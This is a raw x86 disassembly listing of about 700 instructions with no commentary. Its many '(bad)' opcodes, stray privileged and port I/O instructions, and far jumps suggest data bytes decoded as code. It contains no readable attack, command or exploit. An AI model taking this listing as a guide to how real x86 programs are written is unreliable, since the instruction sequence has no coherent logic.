  411ed8:	je     0x411f17
  411eda:	push   ebp
  411edb:	mul    DWORD PTR [ebp-0x70]
  411ede:	out    0xc,al
  411ee0:	pop    es
  411ee1:	inc    edx
  411ee2:	add    eax,0x51aec44c
  411ee7:	fst    DWORD PTR [ebx+0x63215346]
  411eed:	inc    ecx
  411eee:	mov    esp,0xeb082c29
  411ef3:	(bad)  
  411ef5:	mov    dh,0x34
  411ef7:	mov    DWORD PTR ds:[edx+edx*4+0x6b],0x8488444
  411f00:	mov    al,ds:0x823f763b
  411f05:	pop    es
  411f06:	ds mov edi,0xebf79398
  411f0c:	adc    ecx,eax
  411f0e:	jl     0x411f3a
  411f10:	sub    al,0x86
  411f12:	sbb    BYTE PTR [ebp-0x74],0x9a
  411f16:	mov    BYTE PTR [eax],dl
  411f18:	mov    ds:0x3ff73296,al
  411f1d:	pop    ss
  411f1e:	cmp    eax,ebp
  411f20:	and    ecx,DWORD PTR [edi]
  411f22:	jbe    0x411f64
  411f24:	aaa    
  411f25:	pop    ss
  411f26:	dec    edi
  411f28:	addr16 dec ecx
  411f2a:	mov    cl,0xb5
  411f2c:	retf   
  411f2d:	adc    DWORD PTR [eax+0x36],ebp
  411f30:	pop    edi
  411f31:	add    al,0x40
  411f33:	jge    0x411f8f
  411f35:	adc    DWORD PTR gs:[esi-0x17],esi
  411f39:	(bad)  
  411f3a:	cmp    al,bl
  411f3c:	(bad)  
  411f3d:	leave  
  411f3e:	jns    0x411fbb
  411f40:	sbb    DWORD PTR [ebp+0x71],0xffffff8a
  411f44:	push   cs
  411f45:	retf   0xfd41
  411f48:	inc    esp
  411f49:	adc    bh,BYTE PTR [eax-0x4e7b1236]
  411f4f:	loope  0x411f5e
  411f51:	iret   
  411f52:	rol    DWORD PTR [ecx],1
  411f54:	repnz or BYTE PTR [ecx],ch
  411f57:	inc    edi
  411f58:	stc    
  411f59:	xor    al,BYTE PTR fs:[edi+0x35]
  411f5d:	ds pop ebp
  411f5f:	(bad)  
  411f60:	dec    edi
  411f61:	cmp    al,0xaf
  411f63:	pop    esp
  411f64:	add    BYTE PTR [edx],al
  411f66:	test   eax,0x97dbcb66
  411f6b:	repz call 0x2582:0x9a1be18a
  411f73:	jmp    esi
  411f75:	clc    
  411f76:	or     cl,BYTE PTR [eax+0x31]
  411f79:	mov    edi,0xee5d72e3
  411f7e:	add    DWORD PTR [eax-0x2f88851e],edi
  411f84:	push   ebx
  411f85:	shr    DWORD PTR [esi+0x36],1
  411f88:	(bad)  
  411f89:	in     eax,dx
  411f8a:	jns    0x411faf
  411f8c:	push   esi
  411f8d:	ja     0x411f6d
  411f8f:	mov    edi,edi
  411f91:	aam    0x84
  411f93:	pop    ebx
  411f94:	cld    
  411f95:	jg     0x411f8a
  411f97:	rol    DWORD PTR [eax+0x66],cl
  411f9a:	sti    
  411f9b:	xor    DWORD PTR es:[ebp-0x3d],edi
  411f9f:	scas   eax,DWORD PTR es:[edi]
  411fa0:	xchg   edi,eax
  411fa1:	test   al,0xd0
  411fa3:	fisub  DWORD PTR ds:0xb255b111
  411fa9:	clc    
  411faa:	jp     0x411f42
  411fac:	jg     0x411f66
  411fae:	iret   
  411faf:	xchg   edx,eax
  411fb0:	mov    edi,0xe16e50a9
  411fb5:	je     0x411fd2
  411fb7:	adc    eax,0x8b280881
  411fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fbd:	enter  0x8de1,0x78
  411fc1:	(bad)  
  411fc2:	jmp    0x567c:0x8ce2aa05
  411fc9:	jmp    0x411fc5
  411fcb:	leave  
  411fcc:	push   edx
  411fcd:	push   ebp
  411fce:	sub    edx,DWORD PTR [edx+0x620d98ad]
  411fd4:	je     0x411fe9
  411fd6:	test   al,0x1d
  411fd8:	add    BYTE PTR [edx-0x784f953],0x1b
  411fdf:	xor    esp,esp
  411fe1:	jge    0x412011
  411fe3:	inc    eax
  411fe4:	jl     0x411ff0
  411fe6:	jg     0x411f99
  411fe8:	rcr    ah,0xb1
  411feb:	jge    0x412055
  411fed:	sub    ch,0x9c
  411ff0:	daa    
  411ff1:	das    
  411ff2:	out    0xdf,eax
  411ff4:	and    BYTE PTR [ecx+0x44],dh
  411ff7:	pop    eax
  411ff8:	mov    al,ds:0xa3fdf2f7
  411ffd:	ja     0x412040
  411fff:	lea    edi,[ecx+0x3bfcd92c]
  412005:	xor    eax,0xec0d1777
  41200a:	sub    al,0x9a
  41200c:	xor    DWORD PTR [edi],edx
  41200e:	(bad)  
  41200f:	ds das 
  412011:	pop    edi
  412012:	xor    BYTE PTR [ecx-0x5ca3e553],0xb8
  412019:	lock in al,dx
  41201b:	sbb    eax,0xd9306721
  412020:	pop    ss
  412021:	in     al,0xc9
  412023:	mov    eax,ds
  412025:	push   eax
  412026:	cwde   
  412027:	mov    ch,dh
  412029:	pusha  
  41202a:	outs   dx,DWORD PTR ds:[esi]
  41202b:	stos   BYTE PTR es:[edi],al
  41202c:	popa   
  41202d:	jl     0x412080
  41202f:	jmp    0x6f39:0xcb38a472
  412036:	sbb    ch,dl
  412038:	adc    ah,0x54
  41203b:	or     bl,BYTE PTR [eax]
  41203d:	xchg   ah,al
  41203f:	push   0x9
  412041:	shl    BYTE PTR [ecx],cl
  412043:	xor    BYTE PTR [ecx-0x1f],ch
  412046:	aas    
  412047:	loopne 0x412064
  412049:	add    DWORD PTR [ebx+0x615bce8a],esi
  41204f:	pop    ss
  412050:	cmp    ah,0x3a
  412053:	popf   
  412054:	xchg   BYTE PTR [edx+0x58],dh
  412057:	fadd   QWORD PTR [edi+0x1]
  41205a:	das    
  41205b:	dec    eax
  41205c:	inc    ebx
  41205d:	outs   dx,DWORD PTR ds:[esi]
  41205e:	lds    esp,FWORD PTR [eax-0x67f7743a]
  412064:	mov    dl,0x5c
  412066:	ss mov ebx,0xeba7c2d4
  41206c:	jmp    0x91da:0x202d8ee
  412073:	rcr    BYTE PTR [ebx-0x5e],0x34
  412077:	sub    bh,ah
  412079:	xchg   ebp,eax
  41207a:	inc    ecx
  41207b:	and    edi,DWORD PTR [edi+0x4c4a2a7b]
  412081:	inc    esi
  412082:	out    dx,al
  412083:	cli    
  412084:	rcl    DWORD PTR [ebx-0x46],0xb2
  412088:	xchg   esp,eax
  412089:	mov    ecx,0x2de3ac18
  41208e:	adc    BYTE PTR [edi],ch
  412090:	pop    ebp
  412091:	in     eax,0x9b
  412093:	std    
  412094:	lods   eax,DWORD PTR ds:[esi]
  412095:	xor    ecx,esp
  412097:	add    ecx,DWORD PTR [eax]
  412099:	les    ebx,FWORD PTR [edx]
  41209b:	mov    ds:0xa89a1e79,eax
  4120a0:	push   edx
  4120a1:	cmp    eax,edi
  4120a3:	xchg   ecx,edx
  4120a5:	jmp    0x4125b0
  4120aa:	cmp    al,0x3f
  4120ac:	mov    al,0xc9
  4120af:	(bad)
  4120b2:	cmc    
  4120b3:	add    esi,esp
  4120b5:	inc    edx
  4120b6:	add    al,0xc0
  4120b8:	repz fs ret 0x7f03
  4120bd:	js     0x412129
  4120bf:	jl     0x412139
  4120c1:	js     0x41206c
  4120c3:	lea    edx,[edi+0x11]
  4120c6:	outs   dx,BYTE PTR ds:[esi]
  4120c7:	push   ecx
  4120c8:	in     al,0x82
  4120ca:	sbb    eax,0xa9c519b4
  4120cf:	mov    WORD PTR [ebx],gs
  4120d1:	popf   
  4120d2:	xchg   esp,eax
  4120d3:	xor    al,0x8a
  4120d5:	push   es
  4120d6:	inc    edx
  4120d7:	das    
  4120d8:	fisttp QWORD PTR [edi+eax*8+0x6e10b88]
  4120df:	aas    
  4120e0:	std    
  4120e1:	cmp    BYTE PTR [ecx],ch
  4120e3:	hlt    
  4120e4:	ins    DWORD PTR es:[edi],dx
  4120e5:	aam    0x93
  4120e7:	scas   al,BYTE PTR es:[edi]
  4120e8:	and    ah,0x29
  4120eb:	push   edx
  4120ec:	fwait
  4120ed:	add    DWORD PTR [ecx-0xc51a77f],eax
  4120f3:	dec    esi
  4120f4:	dec    esi
  4120f5:	pop    edx
  4120f6:	das    
  4120f7:	mov    ecx,0x4d9de65f
  4120fc:	std    
  4120fd:	mov    bh,0xca
  4120ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412100:	xlat   BYTE PTR ds:[ebx]
  412101:	fdiv   DWORD PTR [eax+0x3b]
  412104:	std    
  412105:	jo     0x4120a3
  412107:	mov    bl,0x81
  412109:	xor    BYTE PTR [eax],al
  41210b:	and    ecx,DWORD PTR [eax]
  41210d:	leave  
  41210e:	loop   0x4120ee
  412110:	sbb    DWORD PTR [ebp-0x5],ebp
  412113:	loope  0x41216a
  412115:	fmul   DWORD PTR [edx+0x65]
  412118:	sbb    BYTE PTR [ebx],ch
  41211a:	jne    0x412150
  41211c:	je     0x4120de
  41211e:	pop    ecx
  41211f:	or     eax,0xc5b22a33
  412124:	mov    eax,ds:0x4ad7151b
  412129:	sbb    BYTE PTR [esi],bh
  41212b:	dec    edx
  41212c:	mov    ecx,0x5bf81118
  412131:	dec    esi
  412132:	fucom  st(0)
  412134:	push   ds
  412135:	mov    al,0x9c
  412137:	or     eax,0xc782e640
  41213c:	inc    ebx
  41213d:	shl    DWORD PTR [ebx],0x25
  412140:	jne    0x412108
  412142:	into   
  412143:	aam    0x14
  412145:	adc    edx,eax
  412147:	mov    esi,0x29175f7
  41214c:	out    0x3,eax
  41214e:	inc    esi
  41214f:	or     ebp,DWORD PTR [ebp-0x20ad9f88]
  412155:	xchg   edx,eax
  412156:	popa   
  412157:	(bad)  
  412158:	cmp    bl,BYTE PTR [edx+0x65]
  41215b:	add    eax,0x47362a0
  412160:	or     edx,esp
  412162:	mov    edi,0xe0f3f80
  412167:	or     dh,cl
  412169:	push   ss
  41216a:	pop    eax
  41216b:	js     0x41215f
  41216d:	pop    ss
  41216e:	inc    esp
  41216f:	(bad)  
  412170:	jne    0x412140
  412172:	leave  
  412173:	or     BYTE PTR [ebx-0x33],ah
  412176:	dec    ecx
  412177:	sar    al,cl
  412179:	xor    eax,0xc93059ec
  41217e:	ds gs popf 
  412181:	cmp    DWORD PTR [edx+ebx*4+0x1f],0xffffffcf
  412186:	or     esp,DWORD PTR [esi]
  412188:	fisub  DWORD PTR [ecx+0xdb67566]
  41218e:	fsubr  QWORD PTR [edx]
  412190:	(bad)  
  412191:	sub    eax,0x4ead3abd
  412196:	call   0x2ef2:0x62df84c9
  41219d:	push   esp
  41219e:	jns    0x4121b2
  4121a0:	add    al,BYTE PTR [eax-0x3a]
  4121a3:	mov    ss,WORD PTR [esi+0x70]
  4121a6:	ror    dh,cl
  4121a8:	hlt    
  4121a9:	imul   edx,ebp,0x6f
  4121ac:	sub    al,0x69
  4121ae:	aad    0xc1
  4121b0:	xor    al,BYTE PTR [ebp+0x459b911]
  4121b6:	test   al,0x80
  4121b8:	mov    gs:0x278c4ff,eax
  4121be:	pop    ecx
  4121bf:	mov    esp,0x1d6a58e8
  4121c4:	push   cs
  4121c5:	xor    edi,DWORD PTR [ebp+0x5012cb4a]
  4121cb:	xor    BYTE PTR [edx+eiz*1],bh
  4121ce:	aas    
  4121cf:	test   eax,0xc5b0fafb
  4121d4:	pop    es
  4121d5:	jbe    0x41222f
  4121d7:	inc    ebx
  4121d8:	sbb    al,0x66
  4121da:	lock dec ebx
  4121dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121dd:	mov    cl,0xf6
  4121df:	test   bl,cl
  4121e1:	out    dx,eax
  4121e2:	jnp    0x412167
  4121e4:	fcom   QWORD PTR [ecx+0x553f8a10]
  4121ea:	and    eax,0xffffffc1
  4121ed:	loopne 0x4121f3
  4121ef:	xchg   edi,eax
  4121f0:	rol    DWORD PTR [ecx+edx*8-0x13147086],cl
  4121f7:	or     bl,BYTE PTR [edi]
  4121f9:	loop   0x41222d
  4121fb:	mov    ecx,0x7d512391
  412200:	sahf   
  412201:	add    al,0xe3
  412203:	mov    cl,0x4c
  412205:	cmc    
  412206:	dec    ebp
  412207:	leave  
  412208:	xor    DWORD PTR [ebx-0x27],0x43
  41220c:	jbe    0x412228
  41220e:	(bad)  
  412210:	push   edx
  412211:	xchg   esp,eax
  412212:	cwde   
  412213:	aas    
  412214:	sbb    eax,0xf18598a0
  412219:	push   cs
  41221a:	and    al,0xc8
  41221c:	in     al,dx
  41221d:	in     al,dx
  41221e:	dec    edx
  41221f:	jnp    0x41221e
  412221:	mov    bl,0x55
  412223:	pop    esi
  412224:	mov    bh,bh
  412226:	ins    DWORD PTR es:[edi],dx
  412227:	clc    
  412228:	sti    
  412229:	bound  edi,QWORD PTR [ecx-0x51ceafed]
  41222f:	nop
  412230:	mov    ebp,0x8ca0e1a4
  412235:	test   BYTE PTR [eax+ebp*2],bh
  412238:	inc    DWORD PTR fs:[ebp-0x20]
  41223c:	gs enter 0x2260,0x83
  412241:	pop    ebx
  412242:	or     eax,0xadd9bb41
  412247:	or     esp,eax
  412249:	push   es
  41224a:	dec    edi
  41224b:	mov    al,0xa
  41224d:	cld    
  41224e:	and    BYTE PTR [edi+0x7f1decd2],bl
  412254:	cmp    al,0x3d
  412256:	ror    DWORD PTR [edi+0x63],0xab
  41225a:	jecxz  0x4122d2
  41225c:	cmp    BYTE PTR [ebx-0x8d1d720],cl
  412262:	sbb    eax,0x77732ce8
  412267:	cld    
  412268:	stc    
  412269:	jne    0x41225f
  41226b:	mov    edx,0x17ea0850
  412270:	adc    eax,0x398d523
  412275:	test   DWORD PTR [eax+0x19],ecx
  412278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412279:	or     al,0xf4
  41227b:	inc    esi
  41227c:	fmul   QWORD PTR ds:0x48308783
  412282:	mov    eax,ds:0x78265711
  412287:	int3   
  412288:	mov    eax,ds:0xb8a066bd
  41228d:	pop    esp
  41228e:	fisttp WORD PTR [edx-0x50]
  412291:	adc    BYTE PTR [ebp+0xb],bl
  412294:	sub    dh,BYTE PTR [edx+0x76cc1568]
  41229a:	fisub  WORD PTR [eax-0x6e]
  41229d:	mov    esp,0x7ba0fb95
  4122a2:	je     0x4122f1
  4122a4:	es std 
  4122a6:	sbb    eax,0xfc32daa5
  4122ab:	xchg   edi,eax
  4122ac:	mov    BYTE PTR ds:0x38fb406d,bl
  4122b2:	call   0x2805c902
  4122b7:	xor    dl,cl
  4122b9:	jae    0x4122e6
  4122bb:	fwait
  4122bc:	movntps XMMWORD PTR [eax-0x63],xmm3
  4122c0:	adc    DWORD PTR [eax],eax
  4122c2:	pop    eax
  4122c3:	jns    0x41225a
  4122c5:	jmp    0x8fadb2c6
  4122ca:	aas    
  4122cb:	mov    eax,0xa99fc89e
  4122d0:	in     eax,0xf7
  4122d2:	data16 into 
  4122d4:	mov    al,ds:0x1eb0b38d
  4122d9:	mov    ds:0xb991e695,al
  4122de:	or     dh,bl
  4122e0:	mov    ecx,0x1df20ad
  4122e5:	cdq    
  4122e6:	mov    es,WORD PTR [eax]
  4122e8:	cli    
  4122e9:	(bad)  [edx+0xc]
  4122ec:	pop    ebp
  4122ed:	cmp    ebp,DWORD PTR [edx]
  4122ef:	pop    ecx
  4122f0:	ss pushf 
  4122f2:	add    bh,0xc0
  4122f5:	in     eax,0xfa
  4122f7:	dec    esi
  4122f8:	pop    ss
  4122f9:	jo     0x412320
  4122fb:	fsub   st,st(7)
  4122fd:	aad    0xe6
  4122ff:	daa    
  412300:	mov    edx,0xff1d5ad7
  412305:	popf   
  412306:	adc    dh,BYTE PTR [edx-0x31a5b359]
  41230c:	lea    edx,[edx+ebp*2+0x380d62d4]
  412313:	(bad)  
  412314:	xchg   edi,eax
  412315:	mov    ecx,0x3e61ab32
  41231a:	xchg   ecx,eax
  41231b:	outs   dx,BYTE PTR ds:[esi]
  41231c:	ret    
  41231d:	repz inc ecx
  41231f:	adc    dl,cl
  412321:	or     DWORD PTR [ecx],edx
  412323:	mov    esi,0x59554b52
  412328:	jbe    0x41231b
  41232a:	mov    ebx,0xd411159
  41232f:	mov    cl,BYTE PTR [eax+0x75b066a]
  412335:	mov    ah,0xaa
  412337:	jecxz  0x41231a
  412339:	nop
  41233a:	(bad)  
  41233b:	jmp    0x4123bb
  41233d:	stos   BYTE PTR es:[edi],al
  41233e:	jae    0x4122fc
  412340:	pop    ss
  412341:	add    DWORD PTR [ebx-0x52],eax
  412344:	loope  0x412307
  412346:	jno    0x4123b4
  412348:	mov    bh,ch
  41234a:	imul   edx,DWORD PTR [edx-0x1c7d4856],0x29
  412351:	loope  0x41236b
  412353:	fdivr  DWORD PTR ds:0x693508ea
  412359:	fild   QWORD PTR [edx-0x6cb5944a]
  41235f:	mov    esi,0xd1cb1f92
  412364:	jbe    0x41237a
  412366:	das    
  412367:	not    dh
  412369:	push   es
  41236a:	lods   al,BYTE PTR ds:[esi]
  41236b:	xchg   ebx,eax
  41236c:	rol    BYTE PTR ds:0x1cc74f0b,0xf8
  412373:	out    dx,eax
  412374:	imul   esp,DWORD PTR [ecx-0x4],0x3a
  412378:	xchg   ebx,eax
  412379:	add    DWORD PTR [ebx-0x12d5fc0f],0xffffffd1
  412380:	stc    
  412381:	sub    BYTE PTR [edi],ah
  412383:	xor    DWORD PTR [ebp+0x159b13b1],ebx
  412389:	push   ebx
  41238a:	xor    DWORD PTR [edi-0x56670723],0xb
  412391:	mov    dl,0x59
  412393:	inc    BYTE PTR [edi-0x31]
  412396:	add    dh,ch
  412398:	and    DWORD PTR [eax-0x24d09d2],0x46
  41239f:	cli    
  4123a0:	dec    ecx
  4123a1:	js     0x412331
  4123a3:	xor    ebp,edi
  4123a5:	mov    al,ds:0xe38bd74e
  4123aa:	and    esp,DWORD PTR [esi+0x4a]
  4123ad:	ficom  DWORD PTR [eax]
  4123af:	lahf   
  4123b0:	arpl   di,ax
  4123b2:	stos   DWORD PTR es:[edi],eax
  4123b3:	sbb    ch,BYTE PTR [esi-0x621b28e0]
  4123b9:	jmp    0x4123e8
  4123bb:	inc    ebp
  4123bc:	dec    ebp
  4123bd:	push   edi
  4123be:	add    DWORD PTR [ebx-0x60eb5019],edx
  4123c4:	add    eax,0x3c81ad1f
  4123c9:	jp     0x41239c
  4123cb:	scas   al,BYTE PTR es:[edi]
  4123cc:	imul   ebx,eax,0xffffffba
  4123cf:	sbb    esi,ebx
  4123d1:	retf   0xf643
  4123d4:	push   edx
  4123d5:	or     edx,DWORD PTR [edi]
  4123d7:	pop    ds
  4123d8:	add    DWORD PTR [edx-0x46cfcaad],esp
  4123de:	aas    
  4123df:	aam    0xef
  4123e1:	add    dh,BYTE PTR [ecx-0x2b99e10a]
  4123e7:	imul   DWORD PTR [eax-0x7d]
  4123ea:	ds xchg ecx,eax
  4123ec:	add    BYTE PTR [ecx],cl
  4123ee:	and    edi,eax
  4123f0:	(bad)  
  4123f1:	into   
  4123f2:	xchg   edi,eax
  4123f3:	or     DWORD PTR [ebx+0x1e],edx
  4123f6:	inc    ecx
  4123f7:	jle    0x4123e8
  4123f9:	xchg   edi,eax
  4123fa:	lods   al,BYTE PTR ds:[esi]
  4123fb:	loopne 0x412442
  4123fd:	loop   0x4123fb
  4123ff:	xor    eax,0x432bff86
  412404:	mov    cl,BYTE PTR [esi]
  412406:	sub    BYTE PTR [edi-0x36],cl
  412409:	xchg   bl,cl
  41240b:	lock jne 0x41240d
  41240e:	test   eax,0x8ac40a19
  412413:	jne    0x4123cb
  412415:	popa   
  412416:	(bad)  
  412417:	mov    esi,0x87a2e4ee
  41241c:	sbb    ebp,DWORD PTR [ebp-0xf]
  41241f:	bswap  eax
  412421:	cmp    ah,BYTE PTR [edx+0x2c]
  412424:	jo     0x41245b
  412426:	add    ah,dh
  412428:	sbb    DWORD PTR [ebx+0x15],esp
  41242b:	mov    BYTE PTR [edx-0x14],ch
  41242e:	push   eax
  41242f:	ror    BYTE PTR [esi],cl
  412431:	(bad)  [ecx]
  412433:	sub    DWORD PTR [eax-0x64],edx
  412436:	mov    bl,0x15
  412438:	jg     0x412426
  41243a:	(bad)  
  41243b:	cmp    al,0x49
  41243d:	xor    bh,BYTE PTR [esi-0x16819734]
  412443:	pop    ebx
  412444:	aam    0x7b
  412446:	jl     0x4124c4
  412448:	push   ss
  412449:	push   ebx
  41244a:	adc    al,0x22
  41244c:	lea    ebp,[esi]
  41244e:	pop    esi
  41244f:	push   esp
  412450:	test   al,0x23
  412452:	pusha  
  412453:	sbb    dh,ch
  412455:	sub    esi,DWORD PTR [esi+0x7a6c64aa]
  41245b:	scas   al,BYTE PTR es:[edi]
  41245c:	rcl    BYTE PTR [eax],0x62
  41245f:	dec    esi
  412460:	out    0x4e,eax
  412462:	inc    edi
  412463:	bound  eax,QWORD PTR [ebx-0x70]
  412466:	int    0xc9
  412468:	rcl    BYTE PTR [edx-0x482d87b3],1
  41246e:	mov    bl,0x86
  412470:	ins    DWORD PTR es:[edi],dx
  412471:	(bad)  
  412472:	push   edx
  412473:	sbb    BYTE PTR [ebx-0x4e597be1],al
  412479:	sbb    BYTE PTR [ebx+ecx*8],0xaa
  41247d:	pusha  
  41247e:	push   ecx
  41247f:	mov    cl,0xeb
  412481:	sbb    BYTE PTR [esi-0x31],dl
  412484:	dec    esp
  412485:	aad    0x60
  412487:	inc    ecx
  412488:	and    eax,0x520ec8c2
  41248d:	fcom   DWORD PTR [edx+0x3c]
  412490:	outs   dx,BYTE PTR ds:[esi]
  412491:	cmp    dl,BYTE PTR [eax*1-0x6ba76a05]
  412498:	sti    
  412499:	std    
  41249a:	pop    ebx
  41249b:	add    al,BYTE PTR [ebp-0x4ec7083e]
  4124a1:	ds push esi
  4124a3:	cdq    
  4124a4:	fist   DWORD PTR [ebx+0x76a5744f]
  4124aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ab:	loop   0x41243d
  4124ad:	sub    ah,al
  4124af:	push   esp
  4124b0:	fst    QWORD PTR [ecx+0x5e8c5c01]
  4124b6:	inc    ebp
  4124b7:	or     BYTE PTR [ecx],cl
  4124b9:	ret    0x857
  4124bc:	and    DWORD PTR [ecx+0x72389294],esi
  4124c2:	imul   edi,DWORD PTR [eax-0x635a021c],0xb95ae623
  4124cc:	repz push edx
  4124ce:	pusha  
  4124cf:	pop    edi
  4124d0:	ja     0x412525
  4124d2:	pushf  
  4124d3:	ror    DWORD PTR [esi+0x4],cl
  4124d6:	xchg   BYTE PTR [eax],dh
  4124d8:	mov    edi,0x115c8b95
  4124dd:	cli    
  4124de:	arpl   bp,si
  4124e0:	cwde   
  4124e1:	popf   
  4124e2:	jge    0x412522
  4124e4:	fs lock cmp edx,ebp
  4124e8:	inc    ecx
  4124e9:	cwde   
  4124ea:	les    esi,FWORD PTR [ebp-0x28fa66bb]
  4124f0:	fbld   TBYTE PTR [esi+0xbfc3264]
  4124f6:	xchg   DWORD PTR [ebx+0x74],esi
  4124f9:	scas   eax,DWORD PTR es:[edi]
  4124fa:	dec    ebx
  4124fb:	mov    ds,WORD PTR [edx+0x63]
  4124fe:	push   0xffffffb9
  412500:	lea    esi,[eax]
  412502:	retf   
  412503:	sti    
  412504:	retf   0x67a7
  412507:	jle    0x41250e
  412509:	cmc    
  41250a:	mov    dl,0x2f
  41250c:	clc    
  41250d:	push   ds
  41250e:	imul   ebx,DWORD PTR [edx],0xe506a537
  412514:	retf   
  412515:	pushf  
  412516:	cmp    edx,DWORD PTR [edx+ebp*8]
  412519:	fld    DWORD PTR [esi]
  41251b:	scas   eax,DWORD PTR es:[edi]
  41251c:	push   ds
  41251d:	iret   
  41251e:	jecxz  0x4124ac
  412520:	(bad)  
  412521:	clc    
  412522:	in     al,0xd9
  412524:	retf   0xd39a
  412527:	int    0x48
  412529:	dec    edi
  41252a:	xchg   edx,esp
  41252c:	xchg   ebx,eax
  41252d:	xchg   ebp,eax
  41252e:	dec    edi
  41252f:	cmp    BYTE PTR [edi-0x5b],0x42
  412533:	mov    ch,0x12
  412535:	pop    ds
  412536:	cs int3 
  412538:	cld    
  412539:	dec    esp
  41253a:	into   
  41253b:	cld    
  41253c:	nop
  41253d:	mov    eax,ds:0x1be15cb0
  412542:	adc    al,0xb0
  412544:	adc    esi,DWORD PTR [ecx+0x671527f0]
  41254a:	xchg   esp,eax
  41254b:	out    0x56,eax
  41254d:	lahf   
  41254e:	sbb    DWORD PTR [esi+0x45b6ed6e],ebp
  412554:	es mov cl,0xa8
  412557:	mov    al,bh
  412559:	data16 not BYTE PTR [edx+eax*1]
  41255d:	jle    0x4125aa
  41255f:	pushf  
  412560:	outs   dx,BYTE PTR ds:[esi]
  412561:	sub    ebx,DWORD PTR [edi-0x14a2f6bb]
  412567:	xchg   ebx,eax
  412568:	push   ebx
  412569:	inc    ebp
  41256a:	mov    ebx,esi
  41256c:	xor    eax,0x836c5219
  412571:	popf   
  412572:	(bad)  
  412574:	and    BYTE PTR [ebp+0x14],ah
  412577:	and    ebx,esi
  412579:	add    ecx,ebx
  41257b:	dec    ax
  41257d:	adc    al,0x4d
  41257f:	lods   eax,DWORD PTR ds:[esi]
  412580:	ds mov esi,0x896210f9
  412586:	outs   dx,BYTE PTR ds:[esi]
  412587:	into   
  412588:	bound  ebx,QWORD PTR [esi]
  41258a:	xor    ecx,DWORD PTR [edi-0x5f8c5c4b]
  412590:	push   es
  412591:	adc    bl,ch
  412593:	in     eax,0x44
  412595:	cmp    ecx,DWORD PTR [ecx]
  412597:	xor    BYTE PTR [esi],0x10
  41259a:	add    ch,al
  41259c:	loop   0x4125c9
  41259e:	data16 js 0x4125f2
  4125a1:	jmp    0xc0de:0x7c6a3a9a
  4125a8:	jmp    0xaf7c:0xc04ba488
  4125af:	push   ds
  4125b0:	dec    BYTE PTR [edx]
  4125b2:	jmp    0x412abd
  4125b7:	sar    BYTE PTR ds:[edi],cl
  4125ba:	ret    0xd1d3
  4125bd:	rcl    edx,0xcb
  4125c0:	mov    ch,0x79
  4125c2:	or     eax,0xebc9588a
  4125c7:	sub    al,0x6
  4125c9:	jg     0x412643
  4125cb:	push   0x7c
  4125cd:	js     0x412647
  4125cf:	sbb    ebx,ebx
  4125d1:	xchg   esp,eax
  4125d2:	push   ecx
  4125d3:	push   ss
  4125d4:	shr    ebx,cl
  4125d6:	mov    WORD PTR [esp+ebp*1+0xf0f8de6],es
  4125dd:	cbw    
  4125df:	adc    BYTE PTR [edx],dl
  4125e1:	jle    0x4125ec
  4125e3:	push   0x825ba686
  4125e8:	and    al,0x4d
  4125ea:	cmp    DWORD PTR [ecx+0x6],eax
  4125ed:	repnz sbb al,0x20
  4125f0:	repnz popa 
  4125f2:	mov    eax,esi
  4125f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125f5:	dec    ebx
  4125f6:	xor    eax,0x1570a74a
  4125fb:	in     eax,dx
  4125fc:	xchg   ebx,eax
  4125fd:	push   ds
  4125fe:	adc    eax,0x62157081
  412603:	mov    ah,0x34
  412605:	sbb    al,0xe5
  412607:	loop   0x412639
  412609:	outs   dx,BYTE PTR ds:[esi]
  41260a:	pop    ebp
  41260b:	ret    
  41260c:	pop    eax
  41260d:	stc    
  41260e:	xor    eax,0x9bbfbd05
  412613:	and    DWORD PTR [esi],ebx
  412615:	retf   
  412616:	dec    esi
  412617:	mov    esi,0x218aed88
  41261c:	icebp  
  41261d:	nop
  41261e:	push   edx
  41261f:	push   ebx
  412620:	in     al,dx
  412621:	lahf   
  412622:	pop    ebp
  412623:	imul   ebp,ecx,0x2c
  412626:	outs   dx,DWORD PTR ds:[esi]
  412627:	xchg   edi,eax
  412628:	lock push esi
  41262a:	sub    al,0xc4
  41262c:	push   esi
  41262d:	ret    
  41262e:	jae    0x41264b
  412630:	adc    BYTE PTR [esi],ch
  412632:	cdq    
  412633:	dec    ecx
  412634:	imul   ecx,DWORD PTR [ebp+0x53],0xffffffd8
  412638:	and    DWORD PTR [edi+0x21c76f59],edi
  41263e:	ds aad 0x65
  412641:	faddp  st(4),st
  412643:	into   
  412644:	fs ret 
  412646:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  412648:	fld    TBYTE PTR [eax+0x69595f2b]
  41264e:	inc    edx
  41264f:	dec    esp
  412650:	scas   al,BYTE PTR es:[edi]
  412651:	int    0xd7
  412653:	jnp    0x412644
  412655:	inc    ebx
  412656:	sbb    al,0x7f
  412658:	jbe    0x4125f6
  41265a:	imul   esp,DWORD PTR [edx+0x4c462e4b],0x6230359b
  412664:	or     eax,0xaf64dc9a
  412669:	arpl   WORD PTR ds:0xa0e4c544,bx
  41266f:	scas   al,BYTE PTR es:[edi]
  412670:	xor    bl,ch
  412672:	cs and eax,0xa4688d92
  412678:	or     al,0x7e
  41267a:	leave  
  41267b:	mov    bh,0xb6
  41267d:	and    al,0xf
  41267f:	in     al,0x5b
  412681:	rol    eax,1
  412683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412684:	mov    eax,ds:0xda7993
  412689:	fucomip st,st(3)
  41268b:	dec    ecx
  41268c:	scas   al,BYTE PTR es:[edi]
  41268d:	pop    edx
  41268e:	and    bh,BYTE PTR [esi+0x65]
  412691:	cmp    al,0x7
  412693:	mov    edx,0x14349556
  412698:	gs sbb al,0x4
  41269b:	jmp    0x9b693b9c
  4126a0:	hlt    
  4126a1:	sub    ah,BYTE PTR [ecx-0x56]
  4126a4:	xchg   esi,eax
  4126a5:	sbb    BYTE PTR [edx],al
  4126a7:	mov    edi,0x4db27e2b
  4126ac:	out    dx,eax
  4126ad:	mov    ebx,0xe3d791dd
  4126b2:	leave  
  4126b3:	jno    0x4126a1
  4126b5:	mov    gs,ebx
  4126b7:	neg    DWORD PTR [ebp+ebx*2+0x3f]
  4126bb:	sbb    eax,0x2986f4a2
  4126c0:	hlt    
  4126c1:	jmp    0x933b:0x1022f8ec
  4126c8:	sti    
